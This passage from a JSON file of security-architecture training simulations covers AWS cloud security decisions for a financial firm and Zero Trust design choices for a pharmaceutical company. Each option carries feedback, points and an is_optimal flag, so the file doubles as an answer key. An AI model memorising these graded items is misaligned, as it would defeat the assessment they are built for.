            "text": "Direct Connect provides dedicated private connectivity. VPN provides backup over a different path at lower cost."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Data Encryption Strategy",
        "situation": "The customer portal handles sensitive financial data including PII and transaction information. PCI-DSS and GLBA require encryption. You need to define the encryption strategy for data at rest in AWS.\n\n**Question:** What encryption approach should you implement for sensitive data at rest?",
        "options": [
          {
            "id": "A",
            "text": "AWS managed keys (SSE-S3) for simplicity",
            "feedback": "{'short': 'AWS managed keys lack audit trail and control', 'detailed': \"SSE-S3 encrypts data but: you can't audit key usage (no CloudTrail entries for key access), can't enforce separation of duties (anyone with S3 access can decrypt), and can't implement key rotation policies. For regulated financial data, you need more control and auditability than AWS managed keys provide.\", 'consequence': 'Encryption exists but auditors question lack of key access logging and control.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Customer-managed KMS keys with key policies and rotation",
            "feedback": "{'short': 'Correct! Full control, audit trail, and compliance alignment', 'detailed': 'Customer-managed KMS keys provide: CloudTrail logging of all key usage (who decrypted what, when), key policies for access control (separation of duties), automatic key rotation, and the ability to disable/delete keys if compromised. This meets PCI-DSS requirements for key management documentation and auditing.', 'consequence': 'Full encryption audit trail. Clear key access controls. Compliance requirements satisfied.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Client-side encryption before uploading to AWS",
            "feedback": "{'short': 'Client-side is more complex without significant benefit here', 'detailed': \"Client-side encryption provides maximum control (AWS never sees unencrypted data) but: increases application complexity, makes server-side processing impossible (can't query encrypted data), and requires managing key distribution to clients. For most use cases, KMS encryption provides sufficient control with less complexity.\", 'consequence': 'Increased development complexity. Difficult to implement analytics or search on encrypted data.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "No encryption at rest - TLS in transit is sufficient",
            "feedback": "{'short': 'PCI-DSS requires encryption at rest for cardholder data', 'detailed': \"PCI-DSS Requirement 3.4 mandates rendering cardholder data unreadable wherever it's stored. 'TLS in transit only' is a compliance violation. Additionally, data at rest encryption protects against various threats including insider access and backup theft.\", 'consequence': 'PCI-DSS compliance failure. Potential security breach exposure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Regulated data requires encryption with audit trails and access control. Which approach provides logging and key management?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "KMS customer-managed keys: CloudTrail logs all usage, key policies control who can use keys, automatic rotation available."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Logging and Monitoring Architecture",
        "situation": "Security and compliance require comprehensive logging across all AWS accounts. You need to design a logging architecture that captures security events, supports incident response, and meets compliance requirements.\n\n**Question:** How should you implement logging across the AWS environment?",
        "options": [
          {
            "id": "A",
            "text": "Enable CloudTrail in each account with logs stored locally",
            "feedback": "{'short': 'Decentralized logging creates visibility gaps', 'detailed': 'CloudTrail per account is a start, but local storage means: no unified view for security monitoring, logs could be deleted by compromised account, no correlation across accounts, and complex log collection for SIEM. Security needs centralized visibility across all accounts.', 'consequence': 'Security team must check multiple accounts for investigations. Potential for log tampering.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Centralized logging: CloudTrail, VPC Flow Logs, Config all sent to security account",
            "feedback": "{'short': 'Correct! Centralized logging with comprehensive coverage', 'detailed': \"Centralized logging in a dedicated security account provides: tamper-resistant storage (workload accounts can't delete security logs), unified visibility across all accounts, single integration point for SIEM, simplified incident response, and compliance evidence collection. Combine with GuardDuty and Security Hub for threat detection and security posture management.\", 'consequence': 'Complete security visibility. Efficient incident response. Clean compliance evidence.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Third-party SIEM directly collecting from each account",
            "feedback": "{'short': \"SIEM integration is good but shouldn't replace centralized AWS logging\", 'detailed': 'SIEM integration is valuable for correlation and alerting, but relying solely on SIEM collection means: logs must traverse internet to SIEM, no local copy if SIEM is unavailable, and you lose AWS-native capabilities (Security Hub, GuardDuty integration). Best practice is centralized AWS logging PLUS SIEM forwarding.', 'consequence': 'SIEM dependency without resilient log storage. Lose AWS-native security analytics.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "CloudWatch Logs only - sufficient for operational and security needs",
            "feedback": "{'short': 'CloudWatch alone misses critical security logs', 'detailed': \"CloudWatch Logs captures application logs but doesn't include: API activity (CloudTrail), network flows (VPC Flow Logs), or resource configuration (Config). Security monitoring requires all these sources. CloudWatch is part of the solution, not the complete solution.\", 'consequence': 'Missing critical security telemetry for detection and compliance.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Security team needs logs from all accounts in one place, protected from tampering by workload accounts."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Centralized security account receives CloudTrail, Flow Logs, and Config from all accounts. GuardDuty and Security Hub provide threat detection and posture management."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Container Security for Modernized Portal",
        "situation": "The development team is modernizing the customer portal using containers on EKS (Kubernetes). You need to ensure the container platform is secured appropriately for financial services workloads.\n\n**Question:** What is the most critical container security control to implement first?",
        "options": [
          {
            "id": "A",
            "text": "Runtime security monitoring and threat detection",
            "feedback": "{'short': 'Runtime security is important but not the first priority', 'detailed': \"Runtime security detects threats in running containers, but if you're deploying vulnerable images, you're already compromised. The security hierarchy should be: prevent (image scanning), detect (runtime monitoring), respond. Starting with runtime means you're detecting problems you could have prevented.\", 'consequence': 'Detecting vulnerabilities that could have been caught earlier in the pipeline.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Image scanning in CI/CD pipeline with gate for critical vulnerabilities",
            "feedback": "{'short': 'Correct! Shift left - catch vulnerabilities before deployment', 'detailed': \"Image scanning in CI/CD prevents vulnerable images from ever reaching production. This 'shift left' approach: catches vulnerabilities before deployment, integrates security into developer workflow, enforces standards (no critical vulns in prod), and is more cost-effective than runtime remediation. Build the foundation before adding runtime detection.\", 'consequence': 'Vulnerabilities caught before production. Developers get immediate feedback. Clean images deployed.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Network policies to isolate container traffic",
            "feedback": "{'short': 'Network policies are important but assume secure containers', 'detailed': \"Network policies implement microsegmentation for containers - important for limiting lateral movement. However, if containers themselves are vulnerable, network policies don't prevent exploitation - they only limit blast radius. Address image security first, then layer in network controls.\", 'consequence': 'Network isolation around potentially vulnerable containers.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "EKS cluster hardening and RBAC configuration",
            "feedback": "{'short': 'Cluster security is important but images matter more', 'detailed': 'EKS hardening and RBAC are essential (private API endpoint, least privilege access), but the most common container security issues come from vulnerable images (unpatched base images, vulnerable dependencies). Secure the supply chain (images) first, then the platform.', 'consequence': 'Secure cluster running vulnerable container images.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's the principle of 'shift left' in DevSecOps? Where do you catch problems earliest?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CI/CD image scanning catches vulnerabilities before deployment. Prevent rather than detect."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Compliance Monitoring Approach",
        "situation": "PCI-DSS assessment is in 6 months. You need to implement continuous compliance monitoring to identify and remediate gaps before the assessment and maintain compliance ongoing.\n\n**Question:** How should you implement continuous compliance monitoring?",
        "options": [
          {
            "id": "A",
            "text": "Manual quarterly compliance reviews against PCI requirements",
            "feedback": "{'short': 'Manual reviews are insufficient for cloud environments', 'detailed': \"Cloud environments change rapidly - infrastructure can be modified in seconds. Quarterly manual reviews miss drift between reviews, are labor-intensive, provide point-in-time snapshots only, and don't scale. Compliance monitoring must be continuous and automated in cloud environments.\", 'consequence': 'Three months of drift between reviews. Discover compliance issues right before assessment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "AWS Config rules with Security Hub standards (PCI DSS, CIS)",
            "feedback": "{'short': 'Correct! Automated, continuous compliance monitoring', 'detailed': 'AWS Config rules continuously evaluate resource configurations. Security Hub aggregates findings and provides compliance scoring against standards including PCI DSS and CIS benchmarks. Together they provide: real-time compliance visibility, automated drift detection, centralized dashboard across accounts, and evidence for auditors. Add custom rules for organization-specific requirements.', 'consequence': 'Continuous compliance visibility. Issues detected immediately. Evidence ready for auditors.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Third-party compliance tool separate from AWS native services",
            "feedback": "{'short': \"Third-party tools can supplement but shouldn't replace native\", 'detailed': 'Third-party compliance tools (Prisma Cloud, Dome9, etc.) offer multi-cloud support and additional features. However, they add cost and complexity when AWS native services (Config, Security Hub) provide strong compliance monitoring. Use third-party tools for multi-cloud consistency, not as replacement for native capabilities.', 'consequence': 'Additional cost and complexity when native tools would suffice.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely on cloud provider compliance certifications (SOC 2, PCI)",
            "feedback": "{'short': \"Provider certifications don't cover your responsibility\", 'detailed': \"AWS's PCI DSS certification covers AWS's responsibility in the shared responsibility model. It does NOT cover your configuration, access controls, encryption settings, or application security. You inherit AWS's controls but must still implement and monitor your own. Provider compliance is necessary but not sufficient.\", 'consequence': 'PCI assessor identifies numerous customer-responsibility control gaps.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Cloud changes rapidly. What AWS services provide continuous, automated compliance evaluation?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "AWS Config continuously evaluates configuration. Security Hub aggregates findings against compliance standards like PCI DSS."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Serverless Security Considerations",
        "situation": "The analytics team wants to use Lambda for data processing pipelines. Before approving, you need to ensure appropriate security controls for serverless workloads handling financial data.\n\n**Question:** What is the PRIMARY security concern for Lambda functions processing financial data?",
        "options": [
          {
            "id": "A",
            "text": "OS patching and vulnerability management",
            "feedback": "{'short': 'Lambda is serverless - no OS to patch', 'detailed': 'Lambda is serverless - AWS manages the underlying infrastructure including OS patching. This is a security benefit of serverless, not a concern. Your responsibility shifts to function code and IAM configuration, not infrastructure management.', 'consequence': 'Worrying about something AWS handles while missing actual serverless security concerns.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "IAM role permissions - ensuring least privilege for function execution",
            "feedback": "{'short': 'Correct! IAM is the security control plane for Lambda', 'detailed': 'In serverless, IAM IS the primary security control. Lambda execution roles determine what resources the function can access. Overly permissive roles (a common mistake) could allow data exfiltration or privilege escalation. Function permissions must follow least privilege: only the specific resources and actions needed. Event source permissions (who can invoke) are equally important.', 'consequence': 'Functions operate with minimum necessary permissions. Blast radius limited if code is compromised.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Network security groups for Lambda functions",
            "feedback": "{'short': 'Lambda only uses VPC/SG when VPC-connected', 'detailed': \"Lambda functions don't require VPC connectivity by default - they run in AWS-managed infrastructure. Security groups only apply when you explicitly configure Lambda for VPC access (to reach private resources). IAM permissions, not network security groups, are the primary access control mechanism for Lambda.\", 'consequence': 'Focusing on network controls when IAM is more important for serverless.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Container escape vulnerabilities",
            "feedback": "{'short': \"Lambda isolation is AWS's responsibility\", 'detailed': \"AWS manages Lambda's execution environment isolation (using Firecracker microVMs). Container/VM escape is AWS's responsibility in the shared responsibility model. Your responsibility is function code security and IAM configuration, not infrastructure isolation.\", 'consequence': \"Worrying about AWS's responsibility while missing customer responsibilities.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "In serverless, what's the primary way you control what resources a function can access?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "IAM execution roles define Lambda permissions. Least privilege is critical - functions should only access what they need."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Architecture Review and Approval",
        "situation": "You've designed the cloud security architecture and need CISO approval. Sarah Chen asks: 'What's the single most important architectural decision we've made, and why does it matter for our security posture?'\n\n**Question:** What is the most important architectural decision for Meridian's cloud security posture?",
        "options": [
          {
            "id": "A",
            "text": "Direct Connect for network connectivity - ensures secure data transfer",
            "feedback": "{'short': 'Important for performance but not the foundation', 'detailed': 'Direct Connect provides reliable, private connectivity - important for performance and data transfer security. However, network connectivity is one component. The fundamental architectural decisions around account structure, identity, and governance have broader security implications.', 'consequence': 'Valid point but not the most foundational architectural decision.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Multi-account strategy with centralized security - provides isolation, governance, and visibility",
            "feedback": "{'short': 'Correct! The foundation for everything else', 'detailed': 'Multi-account with Organizations is foundational: it enables blast radius containment (workload isolation), centralized governance (SCPs enforce guardrails), unified security monitoring (centralized logging, GuardDuty, Security Hub), compliance boundaries (PCI workloads isolated), and cost allocation. Every other security decision builds on this account structure. Identity, encryption, and monitoring all leverage this foundation.', 'consequence': 'Strong architectural foundation. Security controls can be implemented consistently across all accounts.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "KMS encryption with customer-managed keys - protects sensitive data",
            "feedback": "{'short': 'Critical for data protection but builds on architecture', 'detailed': \"KMS encryption is essential for protecting financial data and meeting compliance requirements. However, encryption is implemented within the account structure - it's a control that lives within the architecture, not the architecture itself. The multi-account foundation enables consistent encryption policy enforcement via SCPs.\", 'consequence': 'Important control but not the foundational decision.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Federated identity with Azure AD - enables secure access management",
            "feedback": "{'short': 'Essential for access control but builds on architecture', 'detailed': 'Federated identity is critical for access management - single source of truth, SSO, MFA. However, identity federation is implemented across the account structure. The multi-account architecture enables centralized identity configuration (IAM Identity Center) and consistent access policies via SCPs.', 'consequence': 'Important decision but builds on the account architecture.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What architectural decision creates the foundation that all other security controls build upon?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Multi-account with Organizations enables: isolation (accounts), governance (SCPs), visibility (centralized logging), and compliance boundaries. Everything else builds on this."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D3-SIM-002",
    "title": "Zero Trust Implementation",
    "domain": 3,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Security Architect",
    "organization": {
      "name": "NexGen Pharmaceuticals",
      "industry": "Pharmaceutical/Biotech"
    },
    "introduction": "NexGen Pharmaceuticals' board has mandated Zero Trust architecture after a competitor suffered a $200M breach when attackers compromised a contractor's VPN credentials. Your CISO assigns you to lead the transformation: 'We have 24 months and significant budget. Our research IP is our competitive advantage - we're developing treatments worth billions. Design a Zero Trust architecture that protects our crown jewels without crippling research productivity.'",
    "learning_objectives": [
      "Compare and contrast security implications of different architecture models",
      "Given a scenario, apply security principles to secure enterprise infrastructure"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Zero Trust Starting Point",
        "situation": "The CISO asks for your recommendation on where to start the Zero Trust transformation. The IT Director suggests starting with network micro-segmentation: 'That's what Zero Trust is about - segmenting the network.' The Identity team argues for identity-first: 'Users are the biggest risk, start there.' You need to make a recommendation.\n\n**Question:** Where should NexGen begin its Zero Trust implementation?",
        "options": [
          {
            "id": "A",
            "text": "Start with network micro-segmentation - isolate the crown jewels immediately",
            "feedback": "{'short': 'Segmentation without identity creates policy complexity', 'detailed': \"Micro-segmentation requires knowing WHO is accessing resources to create effective policies. Without strong identity, you're segmenting based on IP addresses and network zones - the old model. Identity provides the foundation for policy decisions: 'researcher X can access research data' not 'subnet Y can access server Z'. Start with identity to enable meaningful segmentation.\", 'consequence': 'Segmentation policies based on network addresses. Complex rule management. Limited effectiveness.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Start with identity - strong authentication and conditional access as foundation",
            "feedback": "{'short': 'Correct! Identity is the foundation of Zero Trust', 'detailed': 'Identity is the control plane for Zero Trust. Start by: (1) Establishing strong identity (Azure AD, MFA for all users), (2) Building conditional access policies, (3) Achieving device compliance visibility. This creates the foundation for all other Zero Trust capabilities. Network controls, application access, and data protection all depend on knowing who the user is and whether to trust them.', 'consequence': 'Strong identity foundation enables meaningful policies across all other ZT pillars.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Start everywhere at once - comprehensive transformation is faster",
            "feedback": "{'short': 'Boiling the ocean overwhelms the organization', 'detailed': 'Zero Trust transformation touches every aspect of IT - network, identity, devices, applications, data. Attempting everything simultaneously overwhelms the organization, spreads resources thin, and increases failure risk. Phased approach with identity first creates the foundation that other capabilities build upon.', 'consequence': 'Scope overwhelm. Multiple parallel initiatives conflict. Limited progress everywhere.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Start with data protection - protecting the crown jewels is the ultimate goal",
            "feedback": "{'short': 'Data protection needs identity to be effective', 'detailed': \"Data protection (classification, DLP, rights management) requires knowing who should access what data - that requires identity. DLP policies like 'prevent researchers from sending IP externally' need to know who is a researcher. Start with identity, then layer data protection on top of that foundation.\", 'consequence': \"Data protection rules can't reference user context effectively. Generic rules miss nuance.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What Zero Trust pillar do all other pillars depend on to make policy decisions?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Identity is the foundation - 'who is requesting access' informs all other decisions about network, apps, and data access."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Authentication Strategy",
        "situation": "The identity team presents authentication options. Currently, users have username/password plus RSA tokens for VPN. The team proposes upgrading to Microsoft Authenticator push notifications for all MFA. A security researcher on your team argues for phishing-resistant methods: 'Push notifications can be MFA-fatigued. We need FIDO2 everywhere.'\n\n**Question:** What authentication strategy should you recommend?",
        "options": [
          {
            "id": "A",
            "text": "Microsoft Authenticator for everyone - good balance of security and usability",
            "feedback": "{'short': 'Push notifications are vulnerable to MFA fatigue attacks', 'detailed': \"Push notification MFA is better than SMS or no MFA, but it's vulnerable to 'MFA fatigue' attacks where attackers spam authentication requests until the user accepts one. For a pharmaceutical company protecting billions in research IP, this risk is significant. Phishing-resistant MFA should be required for sensitive access.\", 'consequence': '3 months later, attacker uses MFA fatigue to access researcher account after phishing credentials.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Tiered approach - phishing-resistant (FIDO2) for privileged/research access, push for general",
            "feedback": "{'short': 'Correct! Risk-based authentication with phishing-resistant for sensitive access', 'detailed': 'Tiered authentication balances security and usability: FIDO2 security keys or Windows Hello for business (phishing-resistant) required for research systems, privileged access, and sensitive data. Push notification MFA acceptable for general corporate applications. This protects crown jewels with strongest authentication while maintaining usability for lower-risk access.', 'consequence': 'High-value assets protected by phishing-resistant MFA. User experience maintained for general access.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "FIDO2 for everyone - maximum security across the board",
            "feedback": "{'short': 'FIDO2 everywhere creates adoption challenges', 'detailed': 'FIDO2 security keys are the most secure but require hardware distribution and user training. Mandating them for all 4,200 users (including those who only access email) creates adoption friction and increases help desk burden. Risk-based tiering applies strongest controls where they matter most.', 'consequence': 'Hardware key deployment challenges. User resistance. Delayed rollout.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Keep RSA tokens - proven technology, why change?",
            "feedback": "{'short': \"RSA tokens are outdated and don't support modern Zero Trust\", 'detailed': \"RSA SecurID tokens (TOTP) don't integrate well with modern conditional access policies, don't support passwordless, and are vulnerable to real-time phishing. Modern Zero Trust requires adaptive MFA that can evaluate risk signals and adjust requirements. Legacy tokens should be migrated to modern methods.\", 'consequence': \"Legacy authentication limits Zero Trust capabilities. Can't implement conditional access properly.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's the risk of push notification MFA? What method is immune to this attack?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "MFA fatigue attacks target push notifications. FIDO2/passkeys are phishing-resistant. Tier based on risk."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Micro-Segmentation Approach",
        "situation": "The network team is designing micro-segmentation. They propose starting with the research network: create strict segments around IP databases and research systems. A concern is raised: 'We don't actually know all the traffic flows in the research network. If we segment wrong, we'll break things.' The team asks for guidance.\n\n**Question:** How should you approach micro-segmentation implementation?",
        "options": [
          {
            "id": "A",
            "text": "Deploy strict segmentation immediately - better to be secure and fix issues as they arise",
            "feedback": "{'short': 'Breaking production systems creates resistance and rollback', 'detailed': 'Enforcing segmentation without understanding traffic flows will break legitimate communications. Research systems have complex dependencies that may not be documented. Breaking production research creates backlash against the security program and likely rollback. Discovery before enforcement is essential.', 'consequence': 'Critical research workflows broken. Emergency exceptions created. Segmentation project loses credibility.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Map traffic flows in learning mode first, then create policies based on actual behavior",
            "feedback": "{'short': 'Correct! Discover, design, then enforce', 'detailed': 'Proper micro-segmentation workflow: (1) Deploy in learning/visibility mode - observe actual traffic flows, (2) Map dependencies - understand what talks to what and why, (3) Design policies based on observed legitimate flows + business requirements, (4) Simulate enforcement - show what would be blocked, (5) Remediate issues before enforcement, (6) Enforce in stages with rollback capability.', 'consequence': 'Policies based on actual behavior. Minimal disruption. Stakeholder confidence maintained.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Skip segmentation - VPN removal and identity-based access is enough",
            "feedback": "{'short': 'Network segmentation is a critical Zero Trust layer', 'detailed': 'Identity and network controls are complementary, not alternatives. If credentials are compromised, network segmentation limits what the attacker can access. Defense in depth requires both. Micro-segmentation contains breaches and prevents lateral movement even if identity controls fail.', 'consequence': 'Single layer of defense. Compromised credentials provide broad network access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let the network team decide - this is a network operations issue",
            "feedback": "{'short': 'Security architect must guide security strategy', 'detailed': 'As Security Architect, you own the Zero Trust strategy. The network team implements, but the approach (discovery first, policy design, staged enforcement) is a security decision. Abdicating this guidance results in either broken systems (enforce too fast) or ineffective segmentation (too permissive).', 'consequence': 'No clear strategy. Implementation varies. Inconsistent security posture.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What happens if you enforce network rules without knowing actual traffic patterns?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Micro-segmentation phases: Learn (observe flows) \u00e2\u2020\u2019 Design (create policies) \u00e2\u2020\u2019 Simulate \u00e2\u2020\u2019 Enforce. Discovery before enforcement."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Device Trust Implementation",
        "situation": "The BYOD policy allows researchers to use personal devices. The compliance team is nervous: 'How can we trust unmanaged devices with research data?' The research director pushes back: 'Our scientists need flexibility. Don't restrict their devices.' You need to define device trust levels.\n\n**Question:** How should you handle device trust for unmanaged/BYOD devices?",
        "options": [
          {
            "id": "A",
            "text": "Ban all unmanaged devices - security requires control",
            "feedback": "{'short': 'Complete ban creates shadow IT and productivity issues', 'detailed': 'Banning personal devices entirely drives users to work around controls (shadow IT). Researchers may email data to personal devices or use unauthorized cloud storage. Better to provide controlled access that meets user needs within security boundaries. Zero Trust is about appropriate access, not denial of all access.', 'consequence': 'Researchers find workarounds. Data ends up in uncontrolled locations. Security visibility lost.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Allow unmanaged devices with reduced access - web-only, no sensitive data, enhanced monitoring",
            "feedback": "{'short': 'Correct! Tiered access based on device trust level', 'detailed': 'Device trust tiers enable appropriate access: Unmanaged devices can access web-based applications only (email via browser, collaboration tools) with no data download capability. Managed devices required for research systems and sensitive data. This balances flexibility with protection - users have choice, but access is commensurate with trust level.', 'consequence': 'Users have flexibility for general work. Sensitive access requires trusted devices. Risk managed appropriately.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Trust all devices equally - focus security on data protection instead",
            "feedback": "{'short': 'Device posture is a critical Zero Trust factor', 'detailed': \"Data protection alone isn't sufficient - malware on a compromised device can steal data, capture credentials, or manipulate applications regardless of data-level controls. Device health verification is a core Zero Trust principle: is the device secure? Is it compromised? Device trust enables risk-appropriate access decisions.\", 'consequence': 'Compromised personal device accesses research systems. Malware steals credentials and data.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Require MDM enrollment for all BYOD - partial management as minimum",
            "feedback": "{'short': 'Forced MDM creates adoption friction', 'detailed': \"Requiring MDM enrollment on personal devices creates privacy concerns and adoption resistance. Some users won't enroll their personal devices. A tiered approach (full access = full management, limited access = no management) gives users the choice rather than forcing management on unwilling users.\", 'consequence': 'Users resist MDM on personal devices. Either reduced productivity or workarounds emerge.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you provide access flexibility while still protecting sensitive resources?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Device trust tiers: managed devices = full access, unmanaged = limited access (web only, no sensitive data)."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Remote Access Architecture",
        "situation": "The VPN replacement discussion is underway. Current state: Cisco AnyConnect provides full network tunnel to corporate network. The network team proposes replacing VPN with identity-aware proxy for web applications but keeping VPN for legacy client-server applications. A consultant suggests going fully VPN-less with Software-Defined Perimeter (SDP).\n\n**Question:** What remote access architecture should you implement?",
        "options": [
          {
            "id": "A",
            "text": "Keep VPN for everything - it's proven and users know it",
            "feedback": "{'short': 'VPN provides network access, not Zero Trust application access', 'detailed': \"Traditional VPN provides broad network access once connected - antithetical to Zero Trust's 'least privilege' principle. Once on VPN, users can reach any resource on the network, enabling lateral movement if compromised. Zero Trust requires application-level access control, not network-level access.\", 'consequence': 'VPN remains single point of compromise. Attackers who breach VPN have broad network access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Identity-aware proxy for web apps, SDP for legacy apps, eliminate traditional VPN",
            "feedback": "{'short': 'Correct! Application-level access for all resources, no network-level VPN', 'detailed': \"Modern Zero Trust remote access: (1) Identity-aware proxy (Zscaler, Azure AD App Proxy) for web applications - verify identity before granting access to specific app, (2) SDP/ZTNA for legacy client-server apps - create authorized tunnels to specific applications, not the whole network, (3) Eliminate traditional VPN - no more 'connect and access everything'. Every access request is authenticated and authorized at the application level.\", 'consequence': 'Users access specific applications, not networks. Lateral movement eliminated. Access logged at application granularity.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require all users to work from corporate locations - no remote access needed",
            "feedback": "{'short': 'Remote work is business reality', 'detailed': \"Eliminating remote access isn't realistic for a global company with 12 locations and modern work expectations. Researchers, executives, and many employees need remote access. The goal is secure remote access, not eliminating remote work. Zero Trust enables secure access from anywhere.\", 'consequence': \"Business can't function. Talent leaves for more flexible employers.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Identity-aware proxy for web apps, keep VPN for everything else",
            "feedback": "{'short': 'Hybrid approach still leaves VPN risk for legacy apps', 'detailed': 'Keeping VPN for legacy apps maintains the network-level access problem for those applications. SDP/ZTNA solutions can handle legacy client-server applications without providing broad network access. The goal is eliminating network-level access entirely, not just for web apps.', 'consequence': 'VPN remains for legacy apps. Attackers target VPN for those applications. Partial Zero Trust.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
